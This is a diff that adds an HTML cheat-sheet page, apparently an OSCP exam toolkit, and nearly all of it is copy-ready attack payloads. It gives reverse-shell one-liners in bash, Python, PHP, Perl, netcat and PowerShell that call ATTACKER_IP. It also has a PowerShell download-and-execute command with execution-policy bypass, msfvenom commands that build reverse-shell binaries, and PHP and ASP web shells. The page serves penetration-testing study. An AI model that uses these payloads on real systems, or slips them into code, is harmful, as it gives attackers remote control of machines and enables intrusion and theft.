@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reverse Shells - OSCP Toolkit</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>🐚 Reverse Shells</h1>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="quickcmds.html">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html" class="active">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html">File Transfer</a>
+                <a href="pivoting.html">Pivoting</a>
+                <a href="checklist.html">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="toc">
+            <h3>📑 Quick Navigation</h3>
+            <ul>
+                <li><a href="#listener">Listener Setup</a></li>
+                <li><a href="#bash">Bash Shells</a></li>
+                <li><a href="#python">Python Shells</a></li>
+                <li><a href="#php">PHP Shells</a></li>
+                <li><a href="#perl">Perl Shells</a></li>
+                <li><a href="#netcat">Netcat Shells</a></li>
+                <li><a href="#powershell">PowerShell Shells</a></li>
+                <li><a href="#upgrade">Shell Upgrade</a></li>
+                <li><a href="#msfvenom">Msfvenom Payloads</a></li>
+                <li><a href="#webshells">Web Shells</a></li>
+            </ul>
+        </div>
+
+        <div class="alert alert-info">
+            💡 <strong>Tip:</strong> Replace <code>ATTACKER_IP</code> with your IP and <code>PORT</code> with your listening port (e.g., 4444)
+        </div>
+
+        <h2 id="listener">🎧 Listener Setup</h2>
+        <pre data-lang="bash"><code># Basic netcat listener
+nc -lvnp 4444
+
+# With readline support (better experience)
+rlwrap nc -lvnp 4444
+
+# Socat listener for full TTY
+socat file:`tty`,raw,echo=0 TCP-L:4444</code></pre>
+
+        <h2 id="bash">🐧 Bash</h2>
+        <h3>Basic Bash Reverse Shell</h3>
+        <pre data-lang="bash"><code>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1</code></pre>
+
+        <h3>Alternative Syntax</h3>
+        <pre data-lang="bash"><code>bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1'</code></pre>
+
+        <h3>Exec Method</h3>
+        <pre data-lang="bash"><code>exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/PORT; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre>
+
+        <h3>mkfifo Method</h3>
+        <pre data-lang="bash"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ATTACKER_IP PORT &gt;/tmp/f</code></pre>
+
+        <h2 id="python">🐍 Python</h2>
+        <h3>Python 3</h3>
+        <pre data-lang="python"><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</code></pre>
+
+        <h3>Python 2</h3>
+        <pre data-lang="python"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+
+        <h3>Windows Python</h3>
+        <pre data-lang="python"><code>python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe']);"</code></pre>
+
+        <h2 id="php">🐘 PHP</h2>
+        <h3>PHP exec</h3>
+        <pre data-lang="php"><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
+
+        <h3>PHP shell_exec</h3>
+        <pre data-lang="php"><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
+
+        <h3>PHP File (save as shell.php)</h3>
+        <pre data-lang="php"><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1'"); ?&gt;</code></pre>
+
+        <h2 id="perl">🐪 Perl</h2>
+        <pre data-lang="perl"><code>perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre>
+
+        <h3>Perl with IO::Socket</h3>
+        <pre data-lang="perl"><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></pre>
+
+        <h2 id="netcat">🔌 Netcat</h2>
+        <h3>Netcat with -e (Traditional)</h3>
+        <pre data-lang="bash"><code>nc -e /bin/sh ATTACKER_IP PORT
+nc -e /bin/bash ATTACKER_IP PORT
+nc -e cmd.exe ATTACKER_IP PORT</code></pre>
+
+        <h3>Netcat without -e (OpenBSD)</h3>
+        <pre data-lang="bash"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ATTACKER_IP PORT &gt;/tmp/f</code></pre>
+
+        <h2 id="powershell">⚡ PowerShell</h2>
+        <h3>PowerShell One-Liner</h3>
+        <pre data-lang="powershell"><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+
+        <h3>Download and Execute</h3>
+        <pre data-lang="powershell"><code>powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code></pre>
+
+        <h3>Base64 Encoded</h3>
+        <pre data-lang="bash"><code># On Linux, encode your payload:
+echo -n "PAYLOAD" | iconv -t UTF-16LE | base64 -w 0
+
+# On target:
+powershell -ep bypass -enc BASE64_ENCODED_PAYLOAD</code></pre>
+
+        <h2 id="upgrade">⬆️ Upgrade to Interactive Shell</h2>
+        <div class="alert alert-warning">
+            ⚠️ <strong>Important:</strong> Always upgrade your shell for a better experience!
+        </div>
+        
+        <h3>Step 1: Spawn PTY</h3>
+        <pre data-lang="bash"><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Or
+python -c 'import pty; pty.spawn("/bin/bash")'
+# Or
+script /dev/null -c bash</code></pre>
+
+        <h3>Step 2: Background and Configure</h3>
+        <pre data-lang="bash"><code># Press Ctrl-Z to background the shell, then:
+stty raw -echo; fg
+
+# Back in your shell, reset terminal:
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows 38 columns 116</code></pre>
+
+        <h2 id="msfvenom">🎯 Msfvenom Payloads</h2>
+        <table>
+            <thead>
+                <tr><th>Type</th><th>Command</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>Linux ELF</td><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf</code></td></tr>
+                <tr><td>Windows EXE</td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe</code></td></tr>
+                <tr><td>PHP</td><td><code>msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw &gt; shell.php</code></td></tr>
+                <tr><td>ASP</td><td><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &gt; shell.asp</code></td></tr>
+                <tr><td>JSP</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw &gt; shell.jsp</code></td></tr>
+                <tr><td>WAR</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &gt; shell.war</code></td></tr>
+            </tbody>
+        </table>
+
+        <h2 id="webshells">🌐 Web Shells</h2>
+        <h3>PHP Web Shell</h3>
+        <pre data-lang="php"><code>&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+&lt;?php echo passthru($_GET['cmd']); ?&gt;</code></pre>
+        <p>Usage: <code>http://target/shell.php?cmd=whoami</code></p>
+
+        <h3>ASP Web Shell</h3>
+        <pre data-lang="asp"><code>&lt;%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%&gt;</code></pre>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <script>
+        document.querySelectorAll('pre').forEach(pre => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'Copy';
+            btn.onclick = () => {
+                navigator.clipboard.writeText(pre.querySelector('code').textContent);
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                    btn.classList.remove('copied');
+                }, 2000);
+            };
+            pre.style.position = 'relative';
+            pre.appendChild(btn);
+        });
+    </script>
+</body>
+</html>
